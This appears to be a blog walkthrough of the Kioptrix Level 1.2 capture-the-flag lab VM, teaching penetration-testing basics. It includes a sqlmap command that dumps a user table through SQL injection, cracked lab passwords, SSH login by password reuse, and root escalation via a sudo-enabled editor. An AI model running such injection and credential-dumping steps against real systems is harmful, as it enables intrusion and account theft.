---
layout: blog_item
title:  "Kioptrix Level 1.2 Walkthrough"
date:   2013-12-20 14:00:10
author: Arr0way
description: 'Kioptrix Level 1.2 Walkthrough, CTF solution for Kioptrix Level 1.2.'
categories: [walkthroughs]
tags:
- Kioptrix
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 4.7p1 Debian 8ubuntu1.3 (protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>


## Web Application Investigation

Enumeration of the website discovered it was likely vulnerable to an SQL Injection, entering <code>id='</code> rendered the following MySQL error:

![SQL Error](/img/blog/kioptrix/sql-error.png)


SQLMap was used to successfully dump the databases and crack the hashes:

{% highlight bash %}

[root:~]# sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump

Database: gallery
Table: dev_accounts
[2 entries]
+----+------------+---------------------------------------------+
| id | username   | password                                    |
+----+------------+---------------------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
+----+------------+---------------------------------------------+

{% endhighlight %}

## Non privileged shell

Due to password reuse both accounts were able to ssh, dreg had a limited shell.

## Local Enumeration

Local enumeration of loneferrets home dir disclosed:

{% highlight bash %}
loneferret@Kioptrix3:~$ cat CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
{% endhighlight %}

## Privilege Escalation

<code>sudo ht</code> rendered a file explorer, the user <code>loneferret</code> was added to the sudoers group, making privilege escalation trivial.  

![sudo ht](/img/blog/kioptrix/sudo-ht.png)

{% highlight bash %}

loneferret@Kioptrix3:~$ sudo -s
root@Kioptrix3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix3:~#

{% endhighlight %}
